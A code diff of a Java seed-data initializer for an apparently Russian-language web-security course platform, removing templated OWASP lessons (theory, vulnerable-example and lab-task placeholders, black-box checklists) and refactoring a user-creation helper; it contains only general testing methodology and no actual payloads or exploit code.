-        upsertLesson(lessons, module, 5,
-                "Black box чеклист для A03. Injection",
-                """
-                        ## Чеклист
-
-                        - найти формы ввода и query parameters;
-                        - проверить признаки boolean-based injection;
-                        - сравнить ответы на истинное и ложное условие;
-                        - проверить search, sort, filter и login flows;
-                        - не выполнять DoS и не выходить за scope назначенного lab;
-                        - зафиксировать только минимальное evidence;
-                        - оформить impact и рекомендацию по исправлению.
-                        """);
-    }
-
-    private void seedGenericOwaspLessons(LessonRepository lessons, LearningModule module, OwaspModuleSeed seed) {
-        upsertLesson(lessons, module, 1,
-                seed.title() + ": теория и признаки",
-                """
-                        ## Ориентир курса
-
-                        Материал подготовлен как русскоязычное учебное изложение по мотивам тем PortSwigger
-                        Web Security Academy. Текст и задания адаптированы для PEP: студент создает собственный
-                        Docker lab, доказывает уязвимость white box отчетом и затем проверяет чужие labs black box.
-
-                        ## Суть уязвимости
-
-                        %s.
-
-                        ## Модель угроз
-
-                        При анализе этой темы важно ответить на три вопроса: какие данные или действия защищает
-                        приложение, какой ввод контролирует пользователь и где проходит trust boundary. Уязвимость
-                        появляется не только в одном handler, а в связке маршрута, middleware, бизнес-правила и
-                        хранения состояния.
-
-                        ## Где искать
-
-                        - HTTP endpoints, где решение зависит от пользовательского ввода;
-                        - middleware, security filters, обработчики ошибок и фоновые jobs;
-                        - места, где приложение доверяет client-side данным, URL, headers, cookies или metadata.
-
-                        ## Как читать уязвимый код
-
-                        Сначала найдите источник данных: `req.params`, `req.query`, `req.body`, headers, cookies,
-                        uploaded files или данные из очереди. Затем проследите, где эти данные используются:
-                        в SQL, HTML, URL, файловом пути, проверке роли, криптографии или server-side request. Если
-                        между источником и опасным действием нет явной проверки инварианта, это кандидат на finding.
-
-                        ## Black box признаки
-
-                        Без доступа к коду ищите расхождения в поведении: разные статусы ответа, отличающиеся поля
-                        JSON, сообщения ошибок, изменение времени ответа, доступ к данным другого пользователя или
-                        возможность выполнить действие в неправильном состоянии workflow.
-
-                        ## Минимальный impact
-
-                        Для учебного отчета достаточно показать контролируемое нарушение свойства безопасности:
-                        доступ, целостность, конфиденциальность, аудитируемость или границу trust boundary.
-
-                        ## How to prevent
-
-                        Исправление должно закрывать корневую причину. Добавьте server-side policy, строгую валидацию
-                        контекста, безопасные API фреймворка, аудит важных событий и автоматические тесты на негативные
-                        сценарии. Не ограничивайтесь скрытием кнопки во фронтенде или косметической фильтрацией строки.
-                        """.formatted(seed.theoryFocus()));
-        upsertLesson(lessons, module, 2,
-                "Уязвимый код: " + seed.title(),
-                """
-                        ## Уязвимый пример
-
-                        Ниже пример кода, который намеренно содержит уязвимость по теме `%s`.
-                        Используйте его как идею для собственного lab, но не копируйте в production.
-
-                        ```javascript
-                        %s
-                        ```
-
-                        ## Разбор примера
-
-                        В этом фрагменте есть типичный анти-паттерн: backend принимает пользовательский ввод или
-                        client-side состояние и сразу использует его в чувствительном действии. Для white box отчета
-                        важно не просто показать payload, а объяснить, какая проверка отсутствует и какой инвариант
-                        нарушается.
-
-                        ## Почему это уязвимо
-
-                        %s
-
-                        ## Как воспроизвести в lab
-
-                        Создайте минимальные тестовые данные и один endpoint, где уязвимость видна без доступа к
-                        реальным секретам. Затем выполните нормальный запрос и запрос с измененным параметром.
-                        Сравните результат: доступ к чужому объекту, изменение состояния, утечка поля, bypass шага
-                        workflow или отсутствие security event.
-
-                        ## Что считается хорошим evidence
-
-                        - исходный HTTP-запрос;
-                        - payload или измененный параметр;
-                        - наблюдаемый результат;
-                        - фрагмент кода, где отсутствует проверка;
-                        - объяснение impact в рамках учебного lab.
-
-                        ## Безопасное направление исправления
-
-                        %s
-
-                        ## Regression test
-
-                        После исправления добавьте негативный тест: тот же payload или последовательность действий
-                        должны возвращать отказ, нейтральную ошибку или пустой результат. Тест должен проверять именно
-                        security boundary, а не только успешный happy path.
-                        """.formatted(seed.title(), seed.vulnerableCode(), seed.vulnerabilityReason(), seed.safeFix()));
-        upsertLesson(lessons, module, 3,
-                "White box lab: " + seed.title(),
-                """
-                        ## Задание
-
-                        %s.
-
-                        ## Что должно быть в приложении
-
-                        - Docker image, который запускается без ручных действий;
-                        - `/health`, возвращающий успешный ответ;
-                        - один endpoint или workflow с уязвимостью `%s`;
-                        - тестовые данные, достаточные для воспроизведения;
-                        - безопасный scope без реальных секретов и внешних целей.
-
-                        ## Что приложить в отчет
-
-                        - уязвимый фрагмент кода;
-                        - шаги воспроизведения;
-                        - payload или последовательность действий;
-                        - evidence результата;
-                        - объяснение, почему исправление устраняет корень проблемы.
-                        """.formatted(seed.whiteBoxTask(), seed.title()));
-        upsertLesson(lessons, module, 4,
-                "Black box чеклист: " + seed.title(),
-                """
-                        ## Чеклист тестирования
-
-                        %s.
-
-                        ## Правила отчета
-
-                        - проверяйте только назначенный lab;
-                        - сохраняйте payloads и HTTP-запросы в минимальном виде;
-                        - отделяйте подтвержденные находки от гипотез;
-                        - оценивайте impact через доступ, данные, целостность и воспроизводимость;
-                        - предлагайте исправление, которое устраняет причину, а не только симптом.
-                        """.formatted(seed.blackBoxChecklist()));
-    }
-
     private void upsertLesson(
             LessonRepository lessons,
             LearningModule module,
@@ -1427,17 +989,6 @@ public class DemoDataInitializer {
         }
     }
 
-    private record OwaspModuleSeed(
-            String title,
-            String topic,
-            String theoryFocus,
-            String whiteBoxTask,
-            String blackBoxChecklist,
-            String vulnerableCode,
-            String vulnerabilityReason,
-            String safeFix) {
-    }
-
     private record SecurityModuleSeed(
             String title,
             String topic,
@@ -1450,15 +1001,14 @@ public class DemoDataInitializer {
             String payloads) {
     }
 
-    private void createUser(
+    private AppUser createUser(
             AppUserRepository users,
             PasswordEncoder passwordEncoder,
             String email,
             String rawPassword,
             String displayName,
             Role role) {
-        if (!users.existsByEmail(email)) {
-            users.save(new AppUser(email, passwordEncoder.encode(rawPassword), displayName, role));
-        }
+        return users.findByEmail(email)
+                .orElseGet(() -> users.save(new AppUser(email, passwordEncoder.encode(rawPassword), displayName, role)));
     }
 }
